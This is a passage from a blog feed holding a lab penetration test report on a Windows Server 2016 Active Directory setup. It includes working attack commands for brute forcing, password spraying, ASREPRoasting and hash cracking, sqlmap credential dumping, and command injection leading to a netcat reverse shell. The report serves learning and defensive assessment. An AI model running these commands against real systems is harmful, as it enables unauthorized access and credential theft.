+&lt;/ol></description></item><item><title>Active Directory Penetration Test Report</title><link>https://orangeymango.me/p/active-directory-penetration-test-report/</link><pubDate>Sun, 18 Feb 2024 11:27:22 +0000</pubDate><guid>https://orangeymango.me/p/active-directory-penetration-test-report/</guid><description>&lt;img src="https://wolfcareers.com/wp-content/uploads/2023/01/1_cQGpZGkSuehv-YEXUweMQ-e1672674616339.webp" alt="Featured image of post Active Directory Penetration Test Report" />&lt;p>&lt;em>Date: February 14, 2024&lt;/em>&lt;/p>
+&lt;h2 id="table-of-contents">Table of Contents
+&lt;/h2>&lt;ol>
+&lt;li>Executive Summary&lt;/li>
+&lt;li>Introduction&lt;/li>
+&lt;li>Scope&lt;/li>
+&lt;li>Methodology&lt;/li>
+&lt;li>Findings
+&lt;ul>
+&lt;li>5.1 Windows Server 2016 Setup&lt;/li>
+&lt;li>5.2 Active Directory Configuration
+&lt;ul>
+&lt;li>5.2.1: Implementing Active Directory Domain Services (AD DS)&lt;/li>
+&lt;li>5.2.2: Establish Domain Controller Role on the Server&lt;/li>
+&lt;li>5.2.3: Configure Active Directory Parameters&lt;/li>
+&lt;li>5.2.4: Validate Active Directory Configuration&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>5.3 Attacks
+&lt;ul>
+&lt;li>5.3.1 Brute Force Attack&lt;/li>
+&lt;li>5.3.2 Password Spraying Attack&lt;/li>
+&lt;li>5.3.3 Asreproast attack&lt;/li>
+&lt;li>5.3.4 SQL Injection Attack&lt;/li>
+&lt;li>5.3.5 Command Injection Attack&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>5.4 BloodHound Analysis&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>Recommendations&lt;/li>
+&lt;li>Risk Assessment&lt;/li>
+&lt;li>Regulatory Compliance Considerations&lt;/li>
+&lt;li>Long-Term Security Considerations&lt;/li>
+&lt;li>Disclaimer&lt;/li>
+&lt;li>Acknowledgments&lt;/li>
+&lt;li>Conclusion&lt;/li>
+&lt;/ol>
+&lt;hr>
+&lt;h2 id="1-executive-summary">1. Executive Summary
+&lt;/h2>&lt;p>The objective of the penetration test was to thoroughly assess the security of the Windows Server 2016 environment and Active Directory configuration, aiming to identify potential vulnerabilities exploitable by attackers. Various attack scenarios, including brute force attacks, password spraying attacks, ASREPRoast attacks, SQL injection attacks, and command injection attacks, were simulated to uncover critical weaknesses in the system.&lt;/p>
+&lt;p>Upon examination of the Windows Server 2016 setup, default configurations and delayed application of crucial security patches were discovered, leaving the system vulnerable to known exploits. Additionally, weaknesses in the Active Directory configuration were noted, such as weak password policies, inadequate access controls, and insufficient segregation of duties, increasing the risk of unauthorized access.&lt;/p>
+&lt;p>The findings highlight the urgent need for comprehensive remediation measures to strengthen the organization&amp;rsquo;s security posture. Recommendations include prioritizing regular patching and updates, enforcing robust password policies, reviewing and reinforcing least privilege access controls, implementing effective network segmentation, and conducting frequent security awareness training for employees.&lt;/p>
+&lt;p>Implementing these recommendations will significantly improve the organization&amp;rsquo;s security posture, reducing the likelihood of cyber threats and protecting its assets, reputation, and stakeholder confidence.&lt;/p>
+&lt;hr>
+&lt;h2 id="2-introduction">2. Introduction
+&lt;/h2>&lt;p>The goal of this penetration test was to evaluate Windows Server 2016 security in detail using an Active Directory environment that mimics a standard business infrastructure. Finding weaknesses and possible attack routes was the main goal in order to offer detailed suggestions for strengthening the security posture as a whole.&lt;/p>
+&lt;p>In the digital and linked world of today, businesses mostly depend on technological infrastructure to run their operations effectively. For enterprises looking to create a reliable and scalable network infrastructure, Windows Server 2016 together with Active Directory is a popular option. To reduce possible risks, enterprises must constantly assess and improve the infrastructure&amp;rsquo;s security due to the growing sophistication of cyberattacks.&lt;/p>
+&lt;p>Our objectives in doing this penetration test were to mimic actual attack scenarios and evaluate how resilient the Windows Server 2016 setup and Active Directory configuration were to different online threats. We sought to find flaws and vulnerabilities that may be used by bad actors to obtain unauthorized access, tamper with data integrity, or interfere with company operations using a combination of automated and human methods.&lt;/p>
+&lt;p>The firm will be able to improve its overall security posture by prioritizing repair activities, implementing efficient security controls, and making well-informed decisions about security investments thanks to the data gathered from this penetration test. The company may strengthen its defenses against cyberattacks and preserve the confidence of its stakeholders, assets, and reputation by promptly resolving vulnerabilities that are found and putting the suggested security measures into place.&lt;/p>
+&lt;p>In order to help the company mitigate risks and strengthen its security posture, we will offer comprehensive findings, analysis, and suggestions based on our evaluation throughout this report.&lt;/p>
+&lt;hr>
+&lt;h2 id="3-scope">3. Scope
+&lt;/h2>&lt;p>The scope of this penetration test included:&lt;/p>
+&lt;ol>
+&lt;li>&lt;strong>Setting up a Windows Server 2016 environment:&lt;/strong>
+&lt;ul>
+&lt;li>Creating and configuring a Windows Server 2016 environment with default settings to simulate a standard deployment scenario.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;strong>Configuring Active Directory to simulate a corporate network:&lt;/strong>
+&lt;ul>
+&lt;li>Configuring Active Directory (AD) services to replicate a corporate network environment, including organizational units, user accounts, group policies, and other AD objects.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;strong>Executing a minimum of five distinct attacks targeting the Windows Server environment:&lt;/strong>
+&lt;ul>
+&lt;li>Executing at least five different attack scenarios, covering common vectors such as Brute Force Attack, Password Spraying Attack, ASREPRoast Attack, SQL Injection Attack, Command Injection Attack.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;strong>Utilizing BloodHound for reconnaissance and privilege escalation:&lt;/strong>
+&lt;ul>
+&lt;li>Using BloodHound, a tool for analyzing Active Directory attack paths, to conduct reconnaissance and identify potential attack paths within the Active Directory environment, as well as to assess opportunities for privilege escalation.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;hr>
+&lt;h2 id="4-methodology">4. Methodology
+&lt;/h2>&lt;p>The penetration test employed a blend of manual and automated techniques to simulate real-world attack scenarios. Manual techniques involve the use of human expertise to identify and exploit vulnerabilities in the system, while automated techniques leverage specialized tools and scripts to rapidly scan for and exploit known vulnerabilities.&lt;/p>
+&lt;p>Various attack vectors were explored and exploited to evaluate the robustness of the system&amp;rsquo;s defenses. This included but was not limited to, network-based attacks such as port scanning, service enumeration, and exploitation of software vulnerabilities.&lt;/p>
+&lt;hr>
+&lt;h1 id="5-findings">5. Findings
+&lt;/h1>&lt;h2 id="51-windows-server-2016-setup">5.1 Windows Server 2016 Setup
+&lt;/h2>&lt;p>The Windows Server 2016 environment was configured with default settings, including standard services and configurations. However, critical security patches and updates were not promptly applied, leaving the system susceptible to known vulnerabilities.&lt;/p>
+&lt;p>Installation Process Overview:&lt;/p>
+&lt;p>&lt;strong>Prepare for Installation:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>Download the Windows Server 2016 ISO from the Microsoft website or a licensed distributor.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Create a new virtual machine (VM) using VMware Workstation or similar software.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Attach the Windows Server 2016 ISO file to the VM&amp;rsquo;s virtual CD/DVD drive.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Adjust VM settings such as CPU cores, RAM, disk size, and network adapter settings.&lt;/p>
+&lt;p>&lt;img src="https://orangeymango.me/ad/Untitled.png"
+loading="lazy"
+alt="image"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;ol>
+&lt;li>
+&lt;p>&lt;strong>Boot from Installation Media:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>Power on the VM and ensure it boots from the Windows Server 2016 installation ISO.&lt;/li>
+&lt;li>Press any key to boot from CD or DVD when prompted.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Start Installation:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>Select language, time, and keyboard input preferences.&lt;/li>
+&lt;li>Click &amp;ldquo;Install Now&amp;rdquo; to begin the installation process.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Enter Product Key:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>Optionally enter a product key for Windows Server 2016.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Select Operating System Edition:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>Choose the desired edition of Windows Server 2016.&lt;/p>
+&lt;p>&lt;img src="https://orangeymango.me/ad/Untitled1.png"
+loading="lazy"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Accept License Terms:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>Read and accept the license terms.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Choose Installation Type:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>Select &amp;ldquo;Custom: Install Windows only (advanced)&amp;rdquo; for a clean installation.&lt;/p>
+&lt;p>&lt;img src="https://orangeymango.me/ad/Untitled2.png"
+loading="lazy"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Select Installation Drive:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>Choose the drive for installation and configure partitions if necessary.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Begin Installation:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>Start the installation process.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Complete Installation:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>Remove the installation media (ISO file) from the virtual CD/DVD drive.&lt;/li>
+&lt;li>Follow on-screen instructions to set up Windows Server 2016, create user accounts, and configure network settings.&lt;/li>
+&lt;li>Log in to the Windows Server 2016 desktop.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Install VMware Tools:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>Install VMware Tools for enhanced VM performance and additional features.&lt;/p>
+&lt;p>&lt;img src="https://orangeymango.me/ad/Untitled3.png"
+loading="lazy"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Finalize Configuration:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>Customize additional Windows Server 2016 settings as needed.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;p>In summary, the Windows Server 2016 setup process involved downloading the ISO, creating a VM, installing the operating system, configuring settings, and finalizing the setup. However, it lacked timely application of critical security patches and updates, posing potential vulnerabilities to the system.&lt;/p>
+&lt;ul>
+&lt;li>Critical security patches and updates were not promptly applied, leaving the system susceptible to known vulnerabilities.&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;h2 id="52-active-directory-configuration">5.2 Active Directory Configuration
+&lt;/h2>&lt;ul>
+&lt;li>
+&lt;p>Active Directory was configured with default parameters, featuring weak password policies and inadequate access controls.&lt;/p>
+&lt;h3 id="521-implementing-active-directory-domain-services-ad-ds">5.2.1: Implementing Active Directory Domain Services (AD DS)
+&lt;/h3>&lt;ol>
+&lt;li>
+&lt;p>Launch Server Manager on the designated Windows Server 2016 machine.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Navigate to &amp;ldquo;Add roles and features&amp;rdquo; within Server Manager.&lt;/p>
+&lt;p>&lt;img src="https://orangeymango.me/ad/Untitled4.png"
+loading="lazy"
+>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Select &amp;ldquo;Role-based or feature-based installation&amp;rdquo; to align with best practices and proceed accordingly..&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Select the appropriate server from the pool and initiate the installation process.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Choose &amp;ldquo;Active Directory Domain Services&amp;rdquo; from the list of server roles and add required features.&lt;/p>
+&lt;p>&lt;img src="https://orangeymango.me/ad/Untitled5.png"
+loading="lazy"
+>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Review the provided information about AD DS and commence the installation.&lt;/p>
+&lt;/li>
+&lt;/ol>
+&lt;hr>
+&lt;h3 id="522-establish-domain-controller-role-on-the-server">5.2.2: Establish Domain Controller Role on the Server
+&lt;/h3>&lt;ol>
+&lt;li>
+&lt;p>Upon completion of the installation, initiate the promotion of the server to a domain controller.&lt;/p>
+&lt;p>&lt;img src="https://orangeymango.me/ad/Untitled6.png"
+loading="lazy"
+>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Utilize the Active Directory Domain Services Configuration Wizard to specify whether to add a new forest or domain controller.&lt;/p>
+&lt;p>&lt;img src="https://orangeymango.me/ad/Untitled7.png"
+loading="lazy"
+>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Provide essential details such as the root domain name, forest, and domain functional levels.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Set a Directory Services Restore Mode (DSRM) password and review configuration options.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Execute the promotion process and allow the server to restart automatically.&lt;/p>
+&lt;/li>
+&lt;/ol>
+&lt;hr>
+&lt;h3 id="523-configure-active-directory-parameters">5.2.3: Configure Active Directory Parameters
+&lt;/h3>&lt;ol>
+&lt;li>
+&lt;p>Post-restart, access the system using the domain administrator account.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Utilize Server Manager to access &amp;ldquo;Active Directory Users and Computers.&amp;rdquo;&lt;/p>
+&lt;p>&lt;img src="https://orangeymango.me/ad/Untitled8.png"
+loading="lazy"
+>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Establish organizational units (OUs) to organize Active Directory objects effectively.&lt;/p>
+&lt;p>&lt;img src="https://orangeymango.me/ad/Untitled9.png"
+loading="lazy"
+>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Configure Group Policy Objects (GPOs) to enforce security settings and password policies.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Create requisite user accounts, groups, and computer accounts as per organizational requirements.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Configure DNS settings to ensure seamless name resolution within the domain.&lt;/p>
+&lt;/li>
+&lt;/ol>
+&lt;hr>
+&lt;h3 id="524-validate-active-directory-configuration">5.2.4: Validate Active Directory Configuration
+&lt;/h3>&lt;ol>
+&lt;li>
+&lt;p>Validate the Active Directory configuration by reviewing the organizational units, user accounts, groups, and computer accounts.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Ensure proper application of Group Policy Objects (GPOs) by executing &amp;ldquo;gpresult&amp;rdquo; or &amp;ldquo;rsop.msc&amp;rdquo; on client machines.&lt;/p>
+&lt;p>&lt;img src="https://orangeymango.me/ad/Untitled10.png"
+loading="lazy"
+>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Conduct comprehensive testing of user authentication, group membership, and other Active Directory functionalities to verify proper operation.&lt;/p>
+&lt;/li>
+&lt;/ol>
+&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;h2 id="53-attacks">5.3 Attacks
+&lt;/h2>&lt;h3 id="531-brute-force-attack">5.3.1 Brute Force Attack
+&lt;/h3>&lt;ul>
+&lt;li>To execute this attack, the CrackMapExec tool was utilized. CrackMapExec is a powerful penetration testing tool commonly used for scanning and exploitation tasks in Windows environments. It supports various protocols, including SMB, and allows for automated password guessing using wordlists.&lt;/li>
+&lt;/ul>
+&lt;p>&lt;strong>Command: &lt;code>sudo crackmapexec smb 192.168.85.3 -u ap -p /usr/share/wordlists/rockyou.txt&lt;/code>&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>In this specific command:
+&lt;ul>
+&lt;li>&lt;code>sudo crackmapexec smb 192.168.85.3&lt;/code>: Specifies the use of CrackMapExec to target the SMB protocol on the IP address 192.168.85.3. The SMB protocol is commonly used for file sharing in Windows environments.&lt;/li>
+&lt;li>&lt;code>u ap&lt;/code>: Specifies the username &amp;ldquo;ap&amp;rdquo; for authentication. This is the username that will be used in the brute force attack.&lt;/li>
+&lt;li>&lt;code>p /usr/share/wordlists/rockyou.txt&lt;/code>: Specifies the path to a wordlist file containing a list of commonly used passwords (rockyou.txt). CrackMapExec will attempt to authenticate with each password in the wordlist in order to gain access to the system.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;p>&lt;img src="https://orangeymango.me/ad/Untitled11.png"
+loading="lazy"
+>&lt;/p>
+&lt;p>The provided image depicts the output of the brute force attack conducted using CrackMapExec. It provides insight into the results of the attack, including any successful authentication attempts and the discovered credentials.&lt;/p>
+&lt;hr>
+&lt;h3 id="532-password-spraying-attack">5.3.2 Password Spraying Attack
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>This attack was carried out using the CrackMapExec program. A potent penetration testing tool called CrackMapExec is frequently used for Windows environment scanning and exploitation activities. It enables automated password guessing using wordlists and supports a number of protocols, including SMB.&lt;/p>
+&lt;p>&lt;strong>Command:&lt;/strong> &lt;code>crackmapexec smb 192.168.85.3 -d [server.web](http://server.web/) -u username.txt -p Password@123 --continue-on-success&lt;/code>&lt;/p>
+&lt;ul>
+&lt;li>In this specific command:
+&lt;ul>
+&lt;li>&lt;code>crackmapexec smb 192.168.85.3&lt;/code>: Initiates CrackMapExec to target the SMB protocol on the specified IP address.&lt;/li>
+&lt;li>&lt;code>d server.web&lt;/code>: Specifies the domain name for authentication.&lt;/li>
+&lt;li>&lt;code>u username.txt&lt;/code>: Provides a file containing usernames for the attack.&lt;/li>
+&lt;li>&lt;code>p Password@123&lt;/code>: Sets the password to be used during the attack.&lt;/li>
+&lt;li>&lt;code>-continue-on-success&lt;/code>: Instructs the tool to continue the attack even after successful authentication attempts.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;p>&lt;img src="https://orangeymango.me/ad/Untitled12.png"
+loading="lazy"
+>&lt;/p>
+&lt;p>The provided screenshot below illustrates the output of the password spraying attack using CrackMapExec, revealing insights into successful authentication attempts and discovered credentials.&lt;/p>
+&lt;p>Instead of trying multiple passwords for a single username, try a single password across multiple usernames. This reduces the risk of account lockouts and increases the likelihood of success.&lt;/p>
+&lt;hr>
+&lt;h3 id="533-asreproast-attack">5.3.3 Asreproast attack
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>The ASREPRoast attack utilizes tools such as &lt;strong>&lt;code>GetNPUsers.py&lt;/code>&lt;/strong> from the Impacket toolkit to request AS_REP messages containing encrypted ticket-granting service (TGS) tickets for vulnerable Active Directory user accounts. These messages are then captured and cracked offline using password-cracking tools like John the Ripper or Hashcat, revealing plaintext passwords. This attack leverages weaknesses in authentication mechanisms to compromise user accounts within the domain, demonstrating a significant security risk in Active Directory environments.&lt;/p>
+&lt;p>&lt;strong>Command:&lt;/strong> &lt;code>python3 GetNPUser.py [server.web/](http://server.web/) -userfile ../../username.txt -format hashcat -outputfile hashes.asreproast&lt;/code>&lt;/p>
+&lt;ul>
+&lt;li>In this specific command:
+&lt;ul>
+&lt;li>&lt;strong>&lt;code>python3 GetNPUser.py&lt;/code>&lt;/strong>: Executes the Python script &lt;strong>&lt;code>GetNPUser.py&lt;/code>&lt;/strong> for performing the attack.&lt;/li>
+&lt;li>&lt;strong>&lt;code>server.web/&lt;/code>&lt;/strong>: Specifies the target Active Directory domain for the attack.&lt;/li>
+&lt;li>&lt;strong>&lt;code>userfile ../../username.txt&lt;/code>&lt;/strong>: Specifies the path to a file containing a list of usernames to target within the domain.&lt;/li>
+&lt;li>&lt;strong>&lt;code>format hashcat&lt;/code>&lt;/strong>: Specifies the output format for the captured hashes, compatible with Hashcat for offline cracking.&lt;/li>
+&lt;li>&lt;strong>&lt;code>outputfile hashes.asreproast&lt;/code>&lt;/strong>: Specifies the output file name for storing the captured hashes in the ASREPRoast attack format.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;p>&lt;img src="https://orangeymango.me/ad/Untitled13.png"
+loading="lazy"
+>&lt;/p>
+&lt;p>The ASREPRoast attack was successfully executed against the domain &lt;strong>&lt;code>server.web&lt;/code>&lt;/strong>. The Impacket toolkit was used with the &lt;strong>&lt;code>GetNPUser.py&lt;/code>&lt;/strong> script to retrieve AS-REP hashes for users within the domain.&lt;/p>
+&lt;p>&lt;em>Cracking the Hashes&lt;/em>&lt;/p>
+&lt;p>&lt;strong>Command: &lt;code>john -w=password_kerb.txt hashs.txt&lt;/code>&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>In this specific command:
+&lt;ul>
+&lt;li>&lt;strong>&lt;code>john&lt;/code>&lt;/strong>: Refers to the John the Ripper password cracking tool.&lt;/li>
+&lt;li>&lt;strong>&lt;code>w=password_kerb.txt&lt;/code>&lt;/strong>: Specifies the wordlist file (&lt;strong>&lt;code>password_kerb.txt&lt;/code>&lt;/strong>) containing potential passwords.&lt;/li>
+&lt;li>&lt;strong>&lt;code>hashs.txt&lt;/code>&lt;/strong>: Represents the file containing hashed passwords obtained from the ASREPRoast attack.&lt;/li>
+&lt;li>The command aims to crack the hashes in &lt;strong>&lt;code>hashs.txt&lt;/code>&lt;/strong> using the passwords from &lt;strong>&lt;code>password_kerb.txt&lt;/code>&lt;/strong>.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;p>&lt;img src="https://orangeymango.me/ad/Untitled14.png"
+loading="lazy"
+>
+The ASREPRoast attack proved effective against the &lt;code>server.web&lt;/code> domain. By employing the Impacket toolkit and the &lt;code>GetNPUser.py&lt;/code> script, AS-REP hashes for domain users were obtained. Following this, &lt;code>John the Ripper&lt;/code> was employed to crack these hashes offline, with the intention of uncovering plaintext passwords linked to the hashed credentials.&lt;/p>
+&lt;hr>
+&lt;h3 id="534-sql-injection-attack">5.3.4 SQL Injection Attack
+&lt;/h3>&lt;ol>
+&lt;li>
+&lt;p>&lt;strong>Initial Login Attempt:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>Attempted to login with standard credentials.&lt;/p>
+&lt;p>&lt;img src="https://orangeymango.me/ad/Untitled15.png"
+loading="lazy"
+>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Received an error message indicating a potential vulnerability.&lt;/p>
+&lt;p>&lt;img src="https://orangeymango.me/ad/Untitled16.png"
+loading="lazy"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>BurpSuite Capturing:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>Captured the login request using BurpSuite.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Sent the request to the repeater for further analysis.&lt;/p>
+&lt;p>&lt;img src="https://orangeymango.me/ad/Untitled17.png"
+loading="lazy"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Request Analysis:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>Saved the captured request as a file named &amp;lsquo;sql&amp;rsquo;.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Analyzed the request in BurpSuite repeater.&lt;/p>
+&lt;p>&lt;img src="https://orangeymango.me/ad/Untitled18.png"
+loading="lazy"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>SQLMap Execution:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>Executed SQLMap to exploit the SQL injection vulnerability.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Command Used: &lt;code>sqlmap -r sql --dbs --batch&lt;/code>&lt;/p>
+&lt;ul>
+&lt;li>&lt;code>r sql&lt;/code>: Specifies the file containing the captured request.&lt;/li>
+&lt;li>&lt;code>-dbs&lt;/code>: Retrieves available databases.&lt;/li>
+&lt;li>&lt;code>-batch&lt;/code>: Executes SQLMap in batch mode for automation.&lt;/li>
+&lt;/ul>
+&lt;p>&lt;img src="https://orangeymango.me/ad/Untitled19.png"
+loading="lazy"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Database Enumeration:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>SQLMap identified the website as vulnerable to SQL injection.&lt;/li>
+&lt;li>Retrieved available databases using the command.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Data Extraction:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>Command Used: &lt;code>sqlmap -r sql --dbs -D gauranga --dump&lt;/code>.&lt;/p>
+&lt;ul>
+&lt;li>&lt;code>D gauranga&lt;/code>: Specifies the database to target.&lt;/li>
+&lt;li>&lt;code>-dump&lt;/code>: Extracts data from the specified database.&lt;/li>
+&lt;/ul>
+&lt;p>&lt;img src="https://orangeymango.me/ad/Untitled20.png"
+loading="lazy"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Credential Retrieval:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>SQLMap successfully retrieved usernames and passwords from the &amp;lsquo;gauranga&amp;rsquo; database.&lt;/li>
+&lt;li>Obtained admin credentials for further exploitation.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Admin Login:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>Successfully logged in using the obtained admin credentials.&lt;/p>
+&lt;p>&lt;img src="https://orangeymango.me/ad/Untitled21.png"
+loading="lazy"
+>&lt;/p>
+&lt;p>&lt;img src="https://orangeymango.me/ad/Untitled22.png"
+loading="lazy"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;p>The SQL injection attack was successful in exploiting the vulnerability present in the login form. By leveraging SQLMap, sensitive data including usernames and passwords were extracted from the database, granting access as an admin user.&lt;/p>
+&lt;hr>
+&lt;h3 id="535-command-injection-attack">5.3.5 Command Injection Attack
+&lt;/h3>&lt;p>&lt;em>Attack Execution:&lt;/em>&lt;/p>
+&lt;ol>
+&lt;li>
+&lt;p>&lt;strong>Initial Ping Test:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>Attempted to execute a ping command to test the command injection vulnerability.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Command Injection Attempt:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>Injected the command &lt;code>&amp;amp;whoami&lt;/code> into the ping box.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Observed the response showing the current user&amp;rsquo;s authority as &amp;lsquo;system&amp;rsquo;.&lt;/p>
+&lt;p>&lt;img src="https://orangeymango.me/ad/Untitled23.png"
+loading="lazy"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Netcat Setup:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>Set up a listener using Netcat for receiving the reverse shell.&lt;/li>
+&lt;li>Command Used: &lt;code>nc -lnvp 9001&lt;/code>.
+&lt;ul>
+&lt;li>&lt;code>nc&lt;/code>: Netcat command.&lt;/li>
+&lt;li>&lt;code>lnvp&lt;/code>: Options for listening on a specific port (9001) and verbose mode.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Reverse Shell Acquisition:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>Searched for a suitable reverse shell payload on &lt;a class="link" href="https://www.revshells.com/" target="_blank" rel="noopener"
+>revshells.com&lt;/a>.&lt;/li>
+&lt;li>Selected a reverse shell payload compatible with the target environment.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Payload Integration:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>Inserted the obtained reverse shell payload into the ping box.&lt;/p>
+&lt;p>&lt;img src="https://orangeymango.me/ad/Untitled24.png"
+loading="lazy"
+>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Executed the ping command with the injected payload.&lt;/p>
+&lt;p>&lt;img src="https://orangeymango.me/ad/Untitled25.png"
+loading="lazy"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Command Execution:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>As a result of the injected payload, gained command execution within the Windows Server system.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;p>The command injection attack successfully exploited the vulnerability, allowing for arbitrary command execution. By injecting malicious commands into the ping box, an attacker gained access to the target system with system-level privileges, facilitating further malicious activities.&lt;/p>
+&lt;hr>
+&lt;h3 id="54-bloodhound-analysis">5.4 BloodHound Analysis
+&lt;/h3>&lt;ol>
+&lt;li>
+&lt;p>&lt;strong>Setup:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>Installed Neo4j, a graph database management system, and created an account. Neo4j serves as the backend database for BloodHound, storing and analyzing data collected from the Active Directory environment.&lt;/li>
+&lt;li>Installed BloodHound on a Windows system. BloodHound is a powerful tool designed for Active Directory security assessment and reconnaissance, utilizing graph theory and database queries to analyze relationships and permissions within Active Directory.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
